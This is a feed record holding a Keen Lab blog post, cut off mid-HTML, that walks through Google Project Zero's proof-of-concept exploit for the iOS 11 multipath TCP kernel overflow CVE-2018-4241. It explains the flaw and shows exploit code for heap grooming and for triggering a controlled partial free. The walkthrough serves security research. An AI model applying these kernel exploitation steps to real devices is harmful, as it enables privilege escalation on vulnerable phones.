{"code":1,"isDone":false,"toInsertArticleList":[{"createdTime":"2020-10-09 23:25:49","updatedTime":"2020-10-09 23:25:49","title":"Exploiting iOS 11.0-11.3.1 Multi-path-TCP:A walk through","link":"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/","description":"<h1 id=\"Introduction\"><a href=\"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/#Introduction\" class=\"headerlink\" title=\"Introduction\"></a>Introduction</h1> \n<p>The iOS 11 mptcp bug (<strong><a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-4241\" target=\"_blank\" rel=\"noopener\">CVE-2018-4241</a></strong>) discovered by Ian Beer is a serious kernel vulnerability which involves a buffer overflow in <code>mptcp_usr_connectx</code> that allows attackers to execute arbitrary code in a privileged context.</p> \n<p>Ian Beer attached an interesting piece of PoC code which demonstrated a rather elegant technique to obtain the kernel task port with this vulnerability. Extending on his brief writeup that comes with the PoC, this blog post will mainly aim at walking through the PoC in great details as well as covering its background. If you are an iOS security researcher who hasn’t looked into the PoC source code yet, hopefully you will find the materials handy when you decide to do so.</p> \n<p>Please have a copy of mptcp PoC code before we dive in! You can download it from here: <a href=\"https://bugs.chromium.org/p/project-zero/issues/attachment?aid=342508&amp;signed_aid=6W5QEbpa78zrMM3U1z-CqQ==\" target=\"_blank\" rel=\"noopener\">Download</a></p> \n<p><strong>Note</strong>: All credits for exploitation techniques, vulnerability PoC code and original writeup belong to Ian Beer at Google Project Zero.<br><a id=\"more\"></a></br></p> \n<h1 id=\"The-Vulnerability\"><a href=\"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/#The-Vulnerability\" class=\"headerlink\" title=\"The Vulnerability\"></a>The Vulnerability</h1> \n<p>Let’s first take a quick look at the offending code in <code>mptcp_usr_connect()</code>, which is the handler for the <code>connectx</code> syscall for the <code>AP_MULTIPATH</code> socket family:<br> \n  <figure class=\"highlight c\"> \n   <table> \n    <tr> \n     <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n     <td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (src) {</span><br><span class=\"line\">    <span class=\"comment\">// verify sa_len for AF_INET</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (src-&gt;sa_family == AF_INET &amp;&amp;</span><br><span class=\"line\">    src-&gt;sa_len != <span class=\"keyword\">sizeof</span>(mpte-&gt;__mpte_src_v4)) {</span><br><span class=\"line\">mptcplog((LOG_ERR, <span class=\"string\">\"%s IPv4 src len %u\\n\"</span>, __func__,</span><br><span class=\"line\"> src-&gt;sa_len),</span><br><span class=\"line\"> MPTCP_SOCKET_DBG, MPTCP_LOGLVL_ERR);</span><br><span class=\"line\">error = EINVAL;</span><br><span class=\"line\"><span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"comment\">// verify sa_len for AF_INET6</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (src-&gt;sa_family == AF_INET6 &amp;&amp;</span><br><span class=\"line\"> src-&gt;sa_len != <span class=\"keyword\">sizeof</span>(mpte-&gt;__mpte_src_v6)) {</span><br><span class=\"line\">mptcplog((LOG_ERR, <span class=\"string\">\"%s IPv6 src len %u\\n\"</span>, __func__,</span><br><span class=\"line\"> src-&gt;sa_len),</span><br><span class=\"line\"> MPTCP_SOCKET_DBG, MPTCP_LOGLVL_ERR);</span><br><span class=\"line\">error = EINVAL;</span><br><span class=\"line\"><span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"comment\">// code doesn't bail if sa_family is neither AF_INET nor AF_INET6</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> ((mp_so-&gt;so_state &amp; (SS_ISCONNECTED|SS_ISCONNECTING)) == <span class=\"number\">0</span>) {</span><br><span class=\"line\"><span class=\"built_in\">memcpy</span>(&amp;mpte-&gt;mpte_src, src, src-&gt;sa_len);</span><br><span class=\"line\">}</span><br><span class=\"line\">}</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n    </tr> \n   </table> \n  </figure></br></p> \n<p>The code does not validate the <code>sa_len</code> field if <code>src→sa_family</code> is neither <code>AF_INET</code> nor <code>AF_INET6</code> so the function directly falls through to <code>memcpy</code> with a user specified <code>sa_len</code> value up to 255 bytes.</p> \n<h1 id=\"Background\"><a href=\"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/#Background\" class=\"headerlink\" title=\"Background\"></a>Background</h1> \n<h2 id=\"Kernel-zone-heap-allocator\"><a href=\"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/#Kernel-zone-heap-allocator\" class=\"headerlink\" title=\"Kernel zone heap allocator\"></a>Kernel zone heap allocator</h2> \n<p>To oversimplify a bit, kernel heap memory is divided into zones, and within one zone allocations are of the same size. For each zone, kernel keeps four doubly-linked lists to categorize a page’s memory availability, namely:<br> \n  <figure class=\"highlight c\"> \n   <table> \n    <tr> \n     <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br /></br></br></br></br></br></pre></td> \n     <td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> {</span></span><br><span class=\"line\">  <span class=\"keyword\">queue_head_t</span> any_free_foreign;  </span><br><span class=\"line\">  <span class=\"keyword\">queue_head_t</span> all_free;</span><br><span class=\"line\">  <span class=\"keyword\">queue_head_t</span> intermediate;</span><br><span class=\"line\">  <span class=\"keyword\">queue_head_t</span> all_used;</span><br><span class=\"line\">} pages;</span><br /></br></br></br></br></br></pre></td> \n    </tr> \n   </table> \n  </figure></br></p> \n<p>When a memory allocation is requested, <code>intermediate</code> page list is traversed before <code>all_free</code> list, and a free memory block will be returned from the first available page.</p> \n<h2 id=\"Preallocated-ipc-kmsg-buffer\"><a href=\"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/#Preallocated-ipc-kmsg-buffer\" class=\"headerlink\" title=\"Preallocated ipc_kmsg buffer\"></a>Preallocated ipc_kmsg buffer</h2> \n<p><code>ipc_port</code> has a <code>struct ipc_kmsg *premsg</code> member that points to an optional preallocated <code>ipc_kmsg</code> buffer. The intended use case is to allow user space to receive critical messages without the kernel having to make a heap allocation. Each time the kernel sends a real mach message it first checks whether the port has one of these preallocated buffers. In addition, this kernel heap buffer will not be freed after the message gets delivered to user space. Ian Beer uses this fact to increase the stability of the exploit.</p> \n<h2 id=\"Mach-exception-port\"><a href=\"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/#Mach-exception-port\" class=\"headerlink\" title=\"Mach exception port\"></a>Mach exception port</h2> \n<p>Mach provides an IPC-based exception-handling facility wherein exceptions are converted to messages. A thread or task can register one or multiple mach ports as so-called “exception port” to receive information about an exception. When an exception occurs, a message containing information about the exception is sent to the exception port. In this way, together with a mach port with preallocated <code>ipc_kmsg</code> buffer, we can force the kernel to send data to a deterministic location in the heap. Furthermore, we can also partially control the content of the message by manipulating the register state at the time of the exception, which will be dutifully carried over in the message by the kernel.</p> \n<p>For more information about preallocated message and exception handling mechanism, readers are adviced to check out Ian Beer’s excellent writeup on the iOS 10 extra-recipe bug <a href=\"https://googleprojectzero.blogspot.com/2017/04/exception-oriented-exploitation-on-ios.html\" target=\"_blank\" rel=\"noopener\">here</a>, as well as Chapter 9.7 in Amit Singh’s seminal <em>Mac OS X Internals</em>.</p> \n<hr> \n <p>Ok, let’s now dig in!</p> \n <h1 id=\"Finding-the-target\"><a href=\"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/#Finding-the-target\" class=\"headerlink\" title=\"Finding the target\"></a>Finding the target</h1> \n <p>By passing in a <code>src</code> with an unexpected <code>sa_family</code>, we are now able to overflow inside <code>mpte</code>, a <code>mptses</code> structure, with <code>sa_len</code> bytes of attacker-controlled data. Here is the struct declaration in <code>/bsd/netinet/mptcp_var.h:</code><br> \n   <figure class=\"highlight c\"> \n    <table> \n     <tr> \n      <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n      <td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">mptses</span> {</span></span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">union</span> {</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sockaddr</span><span class=\"title\">mpte_src</span>;</span> <span class=\"comment\">// The field we are overflowing out of</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sockaddr_in</span> __<span class=\"title\">mpte_src_v4</span>;</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sockaddr_in6</span> __<span class=\"title\">mpte_src_v6</span>;</span></span><br><span class=\"line\">};</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">union</span> {</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sockaddr</span><span class=\"title\">mpte_dst</span>;</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sockaddr_in</span> __<span class=\"title\">mpte_dst_v4</span>;</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sockaddr_in6</span> __<span class=\"title\">mpte_dst_v6</span>;</span></span><br><span class=\"line\">};</span><br><span class=\"line\"> ...</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span>MPTE_ITFINFO_SIZE4</span></span><br><span class=\"line\"><span class=\"keyword\">uint32_t</span>mpte_itfinfo_size;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">mpt_itf_info</span>_<span class=\"title\">mpte_itfinfo</span>[<span class=\"title\">MPTE_ITFINFO_SIZE</span>];</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">mpt_itf_info</span>*<span class=\"title\">mpte_itfinfo</span>;</span></span><br><span class=\"line\"> ...</span><br><span class=\"line\">};</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n     </tr> \n    </table> \n   </figure></br></p> \n <p>Here, the <code>mpte_itfinfo</code> is particularly interesting because it’s a pointer… keep digging in references to <code>mpte_itfinfo</code>… oh snap!<br> \n   <figure class=\"highlight c\"> \n    <table> \n     <tr> \n      <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br /></br></pre></td> \n      <td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (mpte-&gt;mpte_itfinfo_size &gt; MPTE_ITFINFO_SIZE)</span><br><span class=\"line\">  _FREE(mpte-&gt;mpte_itfinfo, M_TEMP);</span><br /></br></pre></td> \n     </tr> \n    </table> \n   </figure></br></p> \n <p>In <code>mptcp_session_destroy</code>, the address pointed to by <code>mpte_itfinfo</code> is freed, and <code>mpte_itfinfo_size</code> is under our complete control too! Moreover, we don’t need to know a priori the size of the object we would like to <code>_FREE</code>, because <code>kfree_addr()</code> will look up the size from the memory zone struct in which the object resides. (<code>_FREE</code> is just a macro around <code>kfree_addr().</code>)</p> \n <p>This is just too good to be true. </p> \n <h1 id=\"Set-up-the-heap\"><a href=\"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/#Set-up-the-heap\" class=\"headerlink\" title=\"Set up the heap\"></a>Set up the heap</h1> \n <p>To turn this overflow into something actually useful, it’s time for some heap Feng Shui. The end goal here is to have an <code>ipc_kmsg</code> and a <code>pipe buffer</code> overlapping with each other so that we can write to and read from it. In the PoC, Ian Beer chooses to overwrite the lower 3 bytes of <code>mpte_itfinfo</code> with 0x000000, after which it will point to a 16MB aligned page boundary. </p> \n <p>In order to have an <code>ipc_kmsg</code> sitting right at that 16MB boundary, the code alternatingly allocates 16MB of <code>ipc_kmsg</code> and a bunch of mptcp sockets in the kernel heap. The former is done by allocating fake mach ports and sending mach messages of calculated size to the port, during which <code>mach_msg(...MACH_SEND_MSG...)</code> will allocate kernel heap buffer for us and <code>copyin</code> the message from user space. This technique allows us to effectively do the same thing as <code>kalloc</code> but from outside the kernel. We are also able to control the memory zone for the <code>ipc_kmsg</code>, since all it takes is just to work backward, calculate the <code>msgh_size</code> based on the kalloc size we would like to achieve. In the PoC, Ian Beer chose to place <code>ipc_kmsg</code>s in <code>kalloc.2048</code> zone.<br> \n   <figure class=\"highlight c\"> \n    <table> \n     <tr> \n      <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n      <td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// a few times do:</span></span><br><span class=\"line\">  <span class=\"comment\">// alloc 16MB of messages</span></span><br><span class=\"line\">  <span class=\"comment\">// alloc a hundred sockets</span></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"trying to force a 16MB aligned 0x800 kalloc on to freelist\\n\"</span>);</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">7</span>; i++) {</span><br><span class=\"line\"> <span class=\"built_in\">printf</span>(<span class=\"string\">\"%d/6...\\n\"</span>, i);</span><br><span class=\"line\"> <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>; j &lt; <span class=\"number\">0x2000</span>; j++) {</span><br><span class=\"line\"> <span class=\"keyword\">mach_port_t</span> p = fake_kalloc(<span class=\"number\">0x800</span>); <span class=\"comment\">// kalloc.2048 zone block size</span></span><br><span class=\"line\"> }</span><br><span class=\"line\"> <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>; j &lt; <span class=\"number\">100</span>; j++) {</span><br><span class=\"line\"> <span class=\"keyword\">int</span> sock = alloc_mptcp_socket();</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"comment\">// we'll keep two of them:</span></span><br><span class=\"line\"> <span class=\"keyword\">if</span> (i == <span class=\"number\">6</span> &amp;&amp; (j==<span class=\"number\">94</span> || j==<span class=\"number\">95</span>)) {</span><br><span class=\"line\"> target_socks[next_sock] = sock;</span><br><span class=\"line\"> next_sock++;</span><br><span class=\"line\"> next_sock %= (<span class=\"keyword\">sizeof</span>(target_socks)/<span class=\"keyword\">sizeof</span>(target_socks[<span class=\"number\">0</span>]));</span><br><span class=\"line\"> } <span class=\"keyword\">else</span> {</span><br><span class=\"line\"> sockets[next_all_sock++] = sock;</span><br><span class=\"line\"> }</span><br><span class=\"line\"> }</span><br><span class=\"line\"> }</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n     </tr> \n    </table> \n   </figure></br></p> \n <h1 id=\"Trigger-the-bug\"><a href=\"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/#Trigger-the-bug\" class=\"headerlink\" title=\"Trigger the bug\"></a>Trigger the bug</h1> \n <p>The code in <code>do_partial_kfree_with_socket</code> triggers the bug, overwriting the lower 3 bytes of <code>*mpte_itfinfo</code> with NULL bytes and let’s hope now it somewhat looks like the diagram shown below. Fingers crossed! 🤞</p> \n <p><img src=\"http://keenlab.tencent.com/en/img/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/ScreenShot2018-07-13at1-093d217f-befe-4768-b88c-4c3f0840687d.48.09AM.png\" alt=\"\"><br> \n    <figure class=\"highlight c\"> \n     <table> \n      <tr> \n       <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n       <td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">do_partial_kfree_with_socket</span><span class=\"params\">(<span class=\"keyword\">int</span> fd, <span class=\"keyword\">uint64_t</span> kaddr, <span class=\"keyword\">uint32_t</span> n_bytes)</span> </span>{</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sockaddr</span>* <span class=\"title\">sockaddr_src</span> = <span class=\"title\">malloc</span>(256);</span></span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(sockaddr_src, <span class=\"string\">'D'</span>, <span class=\"number\">256</span>);</span><br><span class=\"line\">  *(<span class=\"keyword\">uint64_t</span>*) (((<span class=\"keyword\">uint8_t</span>*)sockaddr_src)+koffset(KFREE_ADDR_OFFSET)) = kaddr;</span><br><span class=\"line\">  sockaddr_src-&gt;sa_len = koffset(KFREE_ADDR_OFFSET)+n_bytes;</span><br><span class=\"line\"> sockaddr_src-&gt;sa_family = <span class=\"string\">'B'</span>; <span class=\"comment\">// An abnormal sa_family </span></span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sockaddr</span>* <span class=\"title\">sockaddr_dst</span> = <span class=\"title\">malloc</span>(256);</span></span><br><span class=\"line\"> <span class=\"built_in\">memset</span>(sockaddr_dst, <span class=\"string\">'C'</span>, <span class=\"number\">256</span>);</span><br><span class=\"line\"> sockaddr_dst-&gt;sa_len = <span class=\"keyword\">sizeof</span>(struct sockaddr_in6);</span><br><span class=\"line\"> sockaddr_dst-&gt;sa_family = AF_INET6;</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"keyword\">sa_endpoints_t</span> eps = {<span class=\"number\">0</span>};</span><br><span class=\"line\"> eps.sae_srcif = <span class=\"number\">0</span>;</span><br><span class=\"line\"> eps.sae_srcaddr = sockaddr_src;</span><br><span class=\"line\"> eps.sae_srcaddrlen = koffset(KFREE_ADDR_OFFSET)+n_bytes;</span><br><span class=\"line\"> eps.sae_dstaddr = sockaddr_dst;</span><br><span class=\"line\"> eps.sae_dstaddrlen = <span class=\"keyword\">sizeof</span>(struct sockaddr_in6);</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"built_in\">printf</span>(<span class=\"string\">\"doing partial overwrite with target value: %016llx, length %d\\n\"</span>, kaddr, n_bytes);</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"keyword\">int</span> err = connectx(</span><br><span class=\"line\"> fd,</span><br><span class=\"line\"> &amp;eps,</span><br><span class=\"line\"> SAE_ASSOCID_ANY,</span><br><span class=\"line\"> <span class=\"number\">0</span>,</span><br><span class=\"line\"> <span class=\"literal\">NULL</span>,</span><br><span class=\"line\"> <span class=\"number\">0</span>,</span><br><span class=\"line\"> <span class=\"literal\">NULL</span>,</span><br><span class=\"line\"> <span class=\"literal\">NULL</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"built_in\">printf</span>(<span class=\"string\">\"err: %d\\n\"</span>, err);</span><br><span class=\"line\"> </span><br><span class=\"line\"> close(fd); <span class=\"comment\">// Trigger the _FREE, but need to wait for mptcp_gc</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"keyword\">return</span>;</span><br><span class=\"line\">}</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n      </tr> \n     </table> \n    </figure></br></img></p> \n <p>After we point <code>mpte_itfinfo</code> to the 16MB boundary, we can trigger the <code>_FREE</code> by just <code>close</code> the socket.</p> \n <p>One caveat is that we need to wait for <code>mptcp_gc</code> because <code>mpte_itfinfo</code> is not instantaneously <code>_FREE</code>‘ed after socket is closed, as evident by the comments of this function in <code>/xnu-4570.41.2/bsd/netinet/mptcp_subr.c</code>:<br> \n   <figure class=\"highlight c\"> \n    <table> \n     <tr> \n      <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n      <td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * MPTCP garbage collector.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * This routine is called by the MP domain on-demand, periodic callout,</span></span><br><span class=\"line\"><span class=\"comment\"> * which is triggered when a MPTCP socket is closed. The callout will</span></span><br><span class=\"line\"><span class=\"comment\"> * repeat as long as this routine returns a non-zero value.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">uint32_t</span></span><br><span class=\"line\">mptcp_gc(struct mppcbinfo *mppi)</span><br><span class=\"line\">{</span><br><span class=\"line\">...</span><br><span class=\"line\"> mptcp_session_destroy(mpte); <span class=\"comment\">// mpte_itfinfo is _FREE'ed here</span></span><br><span class=\"line\">...</span><br><span class=\"line\"> <span class=\"keyword\">return</span> (active)</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">\"waiting for second mptcp gc...\\n\"</span>);</span><br><span class=\"line\"> <span class=\"comment\">// wait for the mptcp gc...</span></span><br><span class=\"line\"> <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">400</span>; i++) {</span><br><span class=\"line\"> usleep(<span class=\"number\">10000</span>);</span><br><span class=\"line\">}</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n     </tr> \n    </table> \n   </figure></br></p> \n <p>After <code>_FREE</code>, hopefully now one of the <code>ipc_kmsg</code> is freed and the page put on the Intermidiate list.</p> \n <p><img src=\"http://keenlab.tencent.com/en/img/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/ScreenShot2018-07-11at4-7293bd49-18de-4f1f-b740-ab1f0218e38f.25.21PM.png\" alt=\"\" /></p> \n <h1 id=\"Allocate-pipes\"><a href=\"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/#Allocate-pipes\" class=\"headerlink\" title=\"Allocate pipes\"></a>Allocate pipes</h1> \n <p>Next, we allocate a bunch of pipes and write to its <code>write end</code> 2047 bytes of data. The backing buffers for these pipes will come from kalloc.2048, hopefully including our 16MB-aligned address:</p> \n <p><img src=\"http://keenlab.tencent.com/en/img/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/ScreenShot2018-07-11at4-f863a95f-fb6b-4211-a7d2-1e198c91787d.26.36PM.png\" alt=\"\" /></p> \n <h1 id=\"Trigger-the-bug-again\"><a href=\"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/#Trigger-the-bug-again\" class=\"headerlink\" title=\"Trigger the bug again\"></a>Trigger the bug again</h1> \n <p>Trigger the bug a second time, <code>_FREE</code> the underlying pipe buffer and put the page on Intermediate page list again.</p> \n <p>After overflow:</p> \n <p><img src=\"http://keenlab.tencent.com/en/img/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/ScreenShot2018-07-13at1-3ea59e74-43c5-4fc0-8cf8-1ee9fdea9066.46.46AM.png\" alt=\"\" /></p> \n <p>After <code>_FREE</code>:</p> \n <p><img src=\"http://keenlab.tencent.com/en/img/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/ScreenShot2018-07-11at4-bae4db7b-80b1-47d5-bf07-1791f930661f.29.34PM.png\" alt=\"\" /></p> \n <h1 id=\"Allocate-more-mach-ports\"><a href=\"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/#Allocate-more-mach-ports\" class=\"headerlink\" title=\"Allocate more mach ports!\"></a>Allocate more mach ports!</h1> \n <p>Next, we allocate a bunch of mach ports with preallocated <code>ipc_kmsg</code> buffers from <code>kalloc.2048</code> zone using <code>mach_port_allocate_full()</code> and pass in the size as a member of the <code>mach_port_qos_t</code> parameter. The desired size for the preallocated buffer is 2048 bytes in order to place it in <code>kalloc.2048</code> zone, hopefully one of them picks up the space we just <code>_FREE</code> ‘ed.</p> \n <p><img src=\"http://keenlab.tencent.com/en/img/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/ScreenShot2018-07-11at5-e2e4478b-2274-4d8e-a98b-26c97212d509.42.43PM.png\" alt=\"\" /></p> \n <p>We then insert a <code>SEND RIGHT</code> to every mach port we allocated in this step, as each one will be registered as another thread’s exception port later.</p> \n <h1 id=\"Catching-the-pipe\"><a href=\"http://keenlab.tencent.com/2018/07/19/Exploiting-iOS-11-0-11-3-1-Multi-path-TCP-A-walk-through/#Catching-the-pipe\" class=\"headerlink\" title=\"Catching the pipe\"></a>Catching the pipe</h1> \n <p>As shown on the diagram above, ideally now we have an <code>ipc_kmsg</code> (which we can get messages sent to and then receive) and a pipe buffer (which we can read and write) overlapping each other. </p> \n <p>We now need to find out which one of the hundreds of pipes we allocated a while ago is on that spot.<br> \n   <figure class=\"highlight c\"> \n    <table> \n     <tr> \n      <td 